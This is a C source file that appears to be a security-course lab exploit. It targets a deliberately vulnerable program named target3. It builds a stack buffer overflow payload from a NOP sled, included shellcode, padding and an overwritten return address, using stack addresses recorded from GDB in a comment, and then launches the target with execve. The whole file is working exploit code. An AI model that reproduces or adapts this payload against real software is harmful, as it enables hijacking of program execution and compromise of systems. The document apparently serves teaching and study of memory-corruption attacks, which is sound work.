#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	
	/* 
	   INFO FROM GDB:

	   % info frame (of bar)
	   
	    Arglist at 0x2021fdf0, args: arg=0x7fffffffefdc "hi there",
	    targ=0x2021fe10 "AAAA", ltarg=88
	    Locals at 0x2021fdf0, Previous frame's sp is 0x2021fe00
	    Saved registers:
	    rbp at 0x2021fdf0, rip at 0x2021fdf8

	   % info frame (of foo)
	   
	   Arglist at 0x2021fe50, args: arg=0x7fffffffefdc "hi there"
	   Locals at 0x2021fe50, Previous frame's sp is 0x2021fe60
	   Saved registers:
	   rbp at 0x2021fe50, rip at 0x2021fe58

	   % p &targ (before targ += strlen(targ))
	   
	   0x2021fe10
	 */

	args[0] = TARGET;
	char exploit[73];
	memset(exploit, '\x00', 73);

	int i;
	for (i = 0; i < 8; i++){
	  exploit[i] = '\x90';
	}

	strcat(exploit, shellcode);
	strcat(exploit, "\x90\x90\x90");

	for (i = 56; i < 68; i++){
	  exploit[i] = '\x90';
	}
	
	exploit[68] = '\x10';
	exploit[69] = '\xfe';
	exploit[70] = '\x21';
	exploit[71] = '\x20';
	exploit[72] = '\x00';

	args[1] = exploit;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
